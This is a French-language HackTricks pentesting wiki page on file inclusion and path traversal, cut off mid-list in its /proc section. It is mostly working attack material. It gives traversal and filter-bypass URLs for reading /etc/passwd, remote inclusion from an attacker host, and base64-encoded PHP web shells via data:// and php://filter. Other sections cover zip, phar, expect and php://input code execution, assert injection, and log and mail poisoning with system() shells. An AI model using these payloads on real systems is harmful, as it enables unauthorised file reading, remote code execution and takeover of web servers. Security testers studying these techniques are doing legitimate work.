# Inclusion de fichiers/Travers√©e de chemin

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Aper√ßus de hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de hacking en temps r√©el**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res annonces**\
Restez inform√© des nouveaux programmes de bug bounty lanc√©s et des mises √† jour cruciales des plateformes

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers aujourd'hui !

## Inclusion de fichiers

**Inclusion de fichiers distants (RFI) :** Le fichier est charg√© depuis un serveur distant (Meilleur : Vous pouvez √©crire le code et le serveur l'ex√©cutera). En php, cela est **d√©sactiv√©** par d√©faut (**allow\_url\_include**).\
**Inclusion de fichiers locaux (LFI) :** Le serveur charge un fichier local.

La vuln√©rabilit√© se produit lorsque l'utilisateur peut contr√¥ler d'une mani√®re ou d'une autre le fichier qui va √™tre charg√© par le serveur.

Fonctions **PHP vuln√©rables** : require, require\_once, include, include\_once

Un outil int√©ressant pour exploiter cette vuln√©rabilit√© : [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Int√©ressant - fichiers LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**En m√©langeant plusieurs listes LFI \*nix et en ajoutant plus de chemins, j'ai cr√©√© celle-ci :**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Essayez √©galement de changer `/` par `\`\
Essayez aussi d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /etc/password (pour v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Fusion de diff√©rentes listes de mots :

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Essayez √©galement de changer `/` par `\`\
Essayez aussi de supprimer `C:/` et d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /boot.ini (pour v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

V√©rifiez la liste LFI de linux.

## LFI de base et contournements

Tous les exemples concernent l'inclusion de fichiers locaux, mais pourraient √©galement √™tre appliqu√©s √† l'inclusion de fichiers distants (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### s√©quences de traversal supprim√©es non r√©cursivement
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Contourner l'ajout de plus de caract√®res √† la fin de la cha√Æne fournie (contournement de : $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ceci est **r√©solu depuis PHP 5.4**

### **Encodage**

Vous pourriez utiliser des encodages non standards comme le double encodage URL (et d'autres) :
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Depuis un dossier existant

Peut-√™tre que le back-end v√©rifie le chemin du dossier :
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorer les R√©pertoires du Syst√®me de Fichiers sur un Serveur

Le syst√®me de fichiers d'un serveur peut √™tre explor√© de mani√®re r√©cursive pour identifier des r√©pertoires, pas seulement des fichiers, en utilisant certaines techniques. Ce processus implique de d√©terminer la profondeur du r√©pertoire et de v√©rifier l'existence de dossiers sp√©cifiques. Voici une m√©thode d√©taill√©e pour y parvenir :

1. **D√©terminer la Profondeur du R√©pertoire :** √âtablissez la profondeur de votre r√©pertoire actuel en r√©cup√©rant avec succ√®s le fichier `/etc/passwd` (applicable si le serveur est bas√© sur Linux). Un exemple d'URL pourrait √™tre structur√© comme suit, indiquant une profondeur de trois :
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders :** Ajoutez le nom du dossier suspect√© (par exemple, `private`) √† l'URL, puis naviguez de nouveau vers `/etc/passwd`. Le niveau de r√©pertoire suppl√©mentaire n√©cessite d'augmenter la profondeur d'un :
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpr√©ter les r√©sultats :** La r√©ponse du serveur indique si le dossier existe :
* **Erreur / Pas de sortie :** Le dossier `private` n'existe probablement pas √† l'emplacement sp√©cifi√©.
* **Contenu de `/etc/passwd` :** La pr√©sence du dossier `private` est confirm√©e.
4. **Exploration r√©cursive :** Les dossiers d√©couverts peuvent √™tre explor√©s davantage pour des sous-r√©pertoires ou des fichiers en utilisant la m√™me technique ou des m√©thodes traditionnelles d'Inclusion de Fichiers Locaux (LFI).

Pour explorer des r√©pertoires √† diff√©rents emplacements dans le syst√®me de fichiers, ajustez la charge utile en cons√©quence. Par exemple, pour v√©rifier si `/var/www/` contient un r√©pertoire `private` (en supposant que le r√©pertoire actuel est √† une profondeur de 3), utilisez :
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Technique de Troncature de Chemin**

La troncature de chemin est une m√©thode utilis√©e pour manipuler les chemins de fichiers dans les applications web. Elle est souvent utilis√©e pour acc√©der √† des fichiers restreints en contournant certaines mesures de s√©curit√© qui ajoutent des caract√®res suppl√©mentaires √† la fin des chemins de fichiers. L'objectif est de cr√©er un chemin de fichier qui, une fois modifi√© par la mesure de s√©curit√©, pointe toujours vers le fichier souhait√©.

En PHP, diverses repr√©sentations d'un chemin de fichier peuvent √™tre consid√©r√©es comme √©quivalentes en raison de la nature du syst√®me de fichiers. Par exemple :

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, et `/etc/passwd/` sont tous trait√©s comme le m√™me chemin.
* Lorsque les 6 derniers caract√®res sont `passwd`, ajouter un `/` (le rendant `passwd/`) ne change pas le fichier cibl√©.
* De m√™me, si `.php` est ajout√© √† un chemin de fichier (comme `shellcode.php`), ajouter un `/.` √† la fin ne modifiera pas le fichier acc√©d√©.

Les exemples fournis d√©montrent comment utiliser la troncature de chemin pour acc√©der √† `/etc/passwd`, une cible courante en raison de son contenu sensible (informations sur les comptes utilisateurs) :
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Dans ces sc√©narios, le nombre de travers√©es n√©cessaires pourrait √™tre d'environ 2027, mais ce nombre peut varier en fonction de la configuration du serveur.

* **Utilisation de segments de points et de caract√®res suppl√©mentaires** : Les s√©quences de travers√©e (`../`) combin√©es avec des segments de points suppl√©mentaires et des caract√®res peuvent √™tre utilis√©es pour naviguer dans le syst√®me de fichiers, en ignorant efficacement les cha√Ænes ajout√©es par le serveur.
* **D√©termination du nombre requis de travers√©es** : Par essais et erreurs, on peut trouver le nombre pr√©cis de s√©quences `../` n√©cessaires pour naviguer jusqu'au r√©pertoire racine puis √† `/etc/passwd`, en s'assurant que toutes les cha√Ænes ajout√©es (comme `.php`) sont neutralis√©es mais que le chemin souhait√© (`/etc/passwd`) reste intact.
* **Commencer par un r√©pertoire fictif** : Il est courant de commencer le chemin par un r√©pertoire inexistant (comme `a/`). Cette technique est utilis√©e comme mesure de pr√©caution ou pour r√©pondre aux exigences de la logique d'analyse de chemin du serveur.

Lors de l'utilisation de techniques de troncature de chemin, il est crucial de comprendre le comportement d'analyse de chemin du serveur et la structure du syst√®me de fichiers. Chaque sc√©nario peut n√©cessiter une approche diff√©rente, et des tests sont souvent n√©cessaires pour trouver la m√©thode la plus efficace.

**Cette vuln√©rabilit√© a √©t√© corrig√©e dans PHP 5.3.**

### **Trucs de contournement de filtre**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Dans php, cela est d√©sactiv√© par d√©faut car **`allow_url_include`** est **D√©sactiv√©.** Il doit √™tre **Activ√©** pour que cela fonctionne, et dans ce cas, vous pourriez inclure un fichier PHP depuis votre serveur et obtenir RCE :
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si pour une raison quelconque **`allow_url_include`** est **Activ√©**, mais que PHP **filtre** l'acc√®s aux pages web externes, [selon ce post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), vous pourriez utiliser par exemple le protocole de donn√©es avec base64 pour d√©coder un code PHP en b64 et obtenir RCE : 

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Dans le code pr√©c√©dent, le `+.txt` final a √©t√© ajout√© car l'attaquant avait besoin d'une cha√Æne se terminant par `.txt`, donc la cha√Æne se termine par cela et apr√®s le d√©codage b64, cette partie ne renverra que des d√©chets et le vrai code PHP sera inclus (et donc, ex√©cut√©).
{% endhint %}

Un autre exemple **ne utilisant pas le protocole `php://`** serait :

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## √âl√©ment racine Python

Dans python, dans un code comme celui-ci :
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si l'utilisateur passe un **chemin absolu** √† **`file_name`**, le **chemin pr√©c√©dent est simplement supprim√©** :
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Il s'agit du comportement pr√©vu selon [la documentation](https://docs.python.org/3.10/library/os.path.html#os.path.join) :

> Si un composant est un chemin absolu, tous les composants pr√©c√©dents sont jet√©s et la jonction continue √† partir du composant de chemin absolu.

## Java Lister les R√©pertoires

Il semble que si vous avez un Path Traversal en Java et que vous **demandez un r√©pertoire** au lieu d'un fichier, un **listing du r√©pertoire est retourn√©**. Cela ne se produira pas dans d'autres langages (√† ma connaissance).

## Top 25 param√®tres

Voici une liste des 25 principaux param√®tres qui pourraient √™tre vuln√©rables aux vuln√©rabilit√©s d'inclusion de fichiers locaux (LFI) (provenant de [lien](https://twitter.com/trbughunters/status/1279768631845494787)) :
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilisant des wrappers et protocoles PHP

### php://filter

Les filtres PHP permettent d'effectuer des **op√©rations de modification de base sur les donn√©es** avant qu'elles ne soient lues ou √©crites. Il existe 5 cat√©gories de filtres :

* [Filtres de cha√Æne](https://www.php.net/manual/en/filters.string.php) :
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags` : Supprime les balises des donn√©es (tout ce qui se trouve entre les caract√®res "<" et ">")
* Notez que ce filtre a disparu des versions modernes de PHP
* [Filtres de conversion](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforme en un autre encodage (`convert.iconv.<input_enc>.<output_enc>`). Pour obtenir la **liste de tous les encodages** pris en charge, ex√©cutez dans la console : `iconv -l`

{% hint style="warning" %}
En abusant du filtre de conversion `convert.iconv.*`, vous pouvez **g√©n√©rer du texte arbitraire**, ce qui pourrait √™tre utile pour √©crire du texte arbitraire ou faire en sorte qu'une fonction comme include traite du texte arbitraire. Pour plus d'infos, consultez [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtres de compression](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate` : Compresse le contenu (utile si vous exfiltrez beaucoup d'infos)
* `zlib.inflate` : D√©compresse les donn√©es
* [Filtres de chiffrement](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Obsol√®te
* `mdecrypt.*` : Obsol√®te
* Autres filtres
* En ex√©cutant dans php `var_dump(stream_get_filters());`, vous pouvez trouver quelques **filtres inattendus** :
* `consumed`
* `dechunk` : inverse l'encodage HTTP en morceaux
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La partie "php://filter" est insensible √† la casse
{% endhint %}

### Utilisation des filtres php comme oracle pour lire des fichiers arbitraires

[**Dans cet article**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle), une technique est propos√©e pour lire un fichier local sans que la sortie soit renvoy√©e par le serveur. Cette technique est bas√©e sur une **exfiltration bool√©enne du fichier (caract√®re par caract√®re) en utilisant des filtres php** comme oracle. Cela est d√ª au fait que les filtres php peuvent √™tre utilis√©s pour rendre un texte suffisamment grand pour que php g√©n√®re une exception.

Dans l'article original, vous pouvez trouver une explication d√©taill√©e de la technique, mais voici un r√©sum√© rapide :

* Utilisez le codec **`UCS-4LE`** pour laisser le caract√®re de t√™te du texte au d√©but et faire en sorte que la taille de la cha√Æne augmente de mani√®re exponentielle.
* Cela sera utilis√© pour g√©n√©rer un **texte si grand lorsque la lettre initiale est devin√©e correctement** que php d√©clenchera une **erreur**.
* Le filtre **dechunk** **supprimera tout si le premier caract√®re n'est pas un hexad√©cimal**, donc nous pouvons savoir si le premier caract√®re est hexad√©cimal.
* Cela, combin√© avec le pr√©c√©dent (et d'autres filtres selon la lettre devin√©e), nous permettra de deviner une lettre au d√©but du texte en voyant quand nous faisons suffisamment de transformations pour qu'elle ne soit plus un caract√®re hexad√©cimal. Parce que si c'est hexad√©cimal, dechunk ne le supprimera pas et la bombe initiale fera que php g√©n√®re une erreur.
* Le codec **convert.iconv.UNICODE.CP930** transforme chaque lettre en la suivante (donc apr√®s ce codec : a -> b). Cela nous permet de d√©couvrir si la premi√®re lettre est un `a` par exemple, car si nous appliquons 6 de ce codec a->b->c->d->e->f->g, la lettre n'est plus un caract√®re hexad√©cimal, donc dechunk ne l'a pas supprim√©e et l'erreur php est d√©clench√©e car elle se multiplie avec la bombe initiale.
* En utilisant d'autres transformations comme **rot13** au d√©but, il est possible de leak d'autres caract√®res comme n, o, p, q, r (et d'autres codecs peuvent √™tre utilis√©s pour d√©placer d'autres lettres dans la plage hexad√©cimale).
* Lorsque le caract√®re initial est un nombre, il est n√©cessaire de l'encoder en base64 et de leak les 2 premi√®res lettres pour leak le nombre.
* Le probl√®me final est de voir **comment leak plus que la lettre initiale**. En utilisant des filtres de m√©moire d'ordre comme **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, il est possible de changer l'ordre des caract√®res et d'obtenir en premi√®re position d'autres lettres du texte.
* Et afin de pouvoir obtenir **davantage de donn√©es**, l'id√©e est de **g√©n√©rer 2 octets de donn√©es inutiles au d√©but** avec **convert.iconv.UTF16.UTF16**, d'appliquer **UCS-4LE** pour le faire **pivoter avec les 2 octets suivants**, et de **supprimer les donn√©es jusqu'aux donn√©es inutiles** (cela supprimera les 2 premiers octets du texte initial). Continuez √† faire cela jusqu'√† atteindre le bit d√©sir√© √† leak.

Dans l'article, un outil pour effectuer cela automatiquement a √©galement √©t√© leak√© : [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Ce wrapper permet d'acc√©der aux descripteurs de fichiers que le processus a ouverts. Potentiellement utile pour exfiltrer le contenu des fichiers ouverts :
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Vous pouvez √©galement utiliser **php://stdin, php://stdout et php://stderr** pour acc√©der aux **descripteurs de fichiers 0, 1 et 2** respectivement (je ne suis pas s√ªr de la fa√ßon dont cela pourrait √™tre utile dans une attaque)

### zip:// et rar://

T√©l√©chargez un fichier Zip ou Rar contenant un PHPShell √† l'int√©rieur et acc√©dez-y.\
Pour pouvoir abuser du protocole rar, il **doit √™tre sp√©cifiquement activ√©**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Notez que ce protocole est restreint par les configurations php **`allow_url_open`** et **`allow_url_include`**

### expect://

Expect doit √™tre activ√©. Vous pouvez ex√©cuter du code en utilisant ceci :
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Sp√©cifiez votre payload dans les param√®tres POST :
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un fichier `.phar` peut √™tre utilis√© pour ex√©cuter du code PHP lorsqu'une application web utilise des fonctions telles que `include` pour le chargement de fichiers. L'extrait de code PHP ci-dessous d√©montre la cr√©ation d'un fichier `.phar` :
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Pour compiler le fichier `.phar`, la commande suivante doit √™tre ex√©cut√©e :
```bash
php --define phar.readonly=0 create_path.php
```
Lors de l'ex√©cution, un fichier nomm√© `test.phar` sera cr√©√©, qui pourrait potentiellement √™tre utilis√© pour exploiter des vuln√©rabilit√©s d'Inclusion de Fichiers Locaux (LFI).

Dans les cas o√π le LFI ne r√©alise que la lecture de fichiers sans ex√©cuter le code PHP √† l'int√©rieur, via des fonctions telles que `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ou `filesize()`, une exploitation d'une vuln√©rabilit√© de d√©s√©rialisation pourrait √™tre tent√©e. Cette vuln√©rabilit√© est associ√©e √† la lecture de fichiers utilisant le protocole `phar`.

Pour une compr√©hension d√©taill√©e de l'exploitation des vuln√©rabilit√©s de d√©s√©rialisation dans le contexte des fichiers `.phar`, r√©f√©rez-vous au document li√© ci-dessous :

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

Il √©tait possible d'abuser de **tout fichier arbitraire lu depuis PHP qui prend en charge les filtres php** pour obtenir un RCE. La description d√©taill√©e peut √™tre [**trouv√©e dans ce post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
R√©sum√© tr√®s rapide : un **d√©passement de 3 octets** dans le tas PHP a √©t√© abus√© pour **modifier la cha√Æne de morceaux libres** d'une taille sp√©cifique afin de pouvoir **√©crire n'importe quoi √† n'importe quelle adresse**, donc un hook a √©t√© ajout√© pour appeler **`system`**.\
Il √©tait possible d'allouer des morceaux de tailles sp√©cifiques en abusant de plus de filtres php.

### Plus de protocoles

V√©rifiez plus de [**protocoles possibles √† inclure ici**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory et php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî √âcrire en m√©moire ou dans un fichier temporaire (pas s√ªr de comment cela peut √™tre utile dans une attaque d'inclusion de fichiers)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acc√©der au syst√®me de fichiers local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acc√©der aux URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acc√©der aux URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Flux de compression
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Trouver des noms de chemin correspondant √† un motif (Cela ne retourne rien d'imprimable, donc pas vraiment utile ici)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flux audio (Pas utile pour lire des fichiers arbitraires)

## LFI via 'assert' de PHP

Les risques d'Inclusion de Fichiers Locaux (LFI) en PHP sont particuli√®rement √©lev√©s lors de l'utilisation de la fonction 'assert', qui peut ex√©cuter du code dans des cha√Ænes. Cela est particuli√®rement probl√©matique si l'entr√©e contenant des caract√®res de travers√©e de r√©pertoire comme ".." est v√©rifi√©e mais pas correctement assainie.

Par exemple, le code PHP pourrait √™tre con√ßu pour emp√™cher la travers√©e de r√©pertoire comme suit :
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bien que cela vise √† arr√™ter la travers√©e, cela cr√©e involontairement un vecteur pour l'injection de code. Pour exploiter cela afin de lire le contenu des fichiers, un attaquant pourrait utiliser :
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
De m√™me, pour ex√©cuter des commandes syst√®me arbitraires, on pourrait utiliser :
```plaintext
' and die(system("id")) or '
```
Il est important de **coder ces charges utiles en URL**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Aper√ßus sur le hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de hacking en temps r√©el**\
Restez √† jour avec le monde du hacking en rapide √©volution gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res annonces**\
Restez inform√© des nouvelles primes de bugs lanc√©es et des mises √† jour cruciales des plateformes

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## PHP Blind Path Traversal

{% hint style="warning" %}
Cette technique est pertinente dans les cas o√π vous **contr√¥lez** le **chemin du fichier** d'une **fonction PHP** qui va **acc√©der √† un fichier** mais vous ne verrez pas le contenu du fichier (comme un simple appel √† **`file()`**) mais le contenu n'est pas affich√©.
{% endhint %}

Dans [**ce post incroyable**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), il est expliqu√© comment un parcours de chemin aveugle peut √™tre abus√© via un filtre PHP pour **exfiltrer le contenu d'un fichier via un oracle d'erreur**.

En r√©sum√©, la technique utilise l'**encodage "UCS-4LE"** pour rendre le contenu d'un fichier si **grand** que la **fonction PHP ouvrant** le fichier d√©clenchera une **erreur**.

Ensuite, afin de divulguer le premier caract√®re, le filtre **`dechunk`** est utilis√© avec d'autres tels que **base64** ou **rot13** et enfin les filtres **convert.iconv.UCS-4.UCS-4LE** et **convert.iconv.UTF16.UTF-16BE** sont utilis√©s pour **placer d'autres caract√®res au d√©but et les divulguer**.

**Fonctions qui pourraient √™tre vuln√©rables** : `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (uniquement pour la lecture cible avec cela)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Pour les d√©tails techniques, consultez le post mentionn√© !

## LFI2RCE

### Inclusion de fichier √† distance

Expliqu√© pr√©c√©demment, [**suivez ce lien**](./#remote-file-inclusion).

### Via le fichier journal Apache/Nginx

Si le serveur Apache ou Nginx est **vuln√©rable √† LFI** √† l'int√©rieur de la fonction d'inclusion, vous pourriez essayer d'acc√©der √† **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, en d√©finissant √† l'int√©rieur de **l'agent utilisateur** ou √† l'int√©rieur d'un **param√®tre GET** un shell PHP comme **`<?php system($_GET['c']); ?>`** et inclure ce fichier

{% hint style="warning" %}
Notez que **si vous utilisez des guillemets doubles** pour le shell au lieu de **guillemets simples**, les guillemets doubles seront modifi√©s pour la cha√Æne "_**quote;**_", **PHP g√©n√©rera une erreur** l√† et **rien d'autre ne sera ex√©cut√©**.

De plus, assurez-vous de **bien √©crire la charge utile** sinon PHP g√©n√©rera une erreur chaque fois qu'il essaiera de charger le fichier journal et vous n'aurez pas une seconde opportunit√©.
{% endhint %}

Cela pourrait √©galement √™tre fait dans d'autres journaux mais **soyez prudent**, le code √† l'int√©rieur des journaux pourrait √™tre cod√© en URL et cela pourrait d√©truire le Shell. L'en-t√™te **authorisation "basic"** contient "user:password" en Base64 et il est d√©cod√© √† l'int√©rieur des journaux. Le PHPShell pourrait √™tre ins√©r√© dans cet en-t√™te.\
Autres chemins de journaux possibles :
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envoyez un mail** √† un compte interne (user@localhost) contenant votre charge utile PHP comme `<?php echo system($_REQUEST["cmd"]); ?>` et essayez d'inclure dans le mail de l'utilisateur avec un chemin comme **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. T√©l√©chargez beaucoup de shells (par exemple : 100)
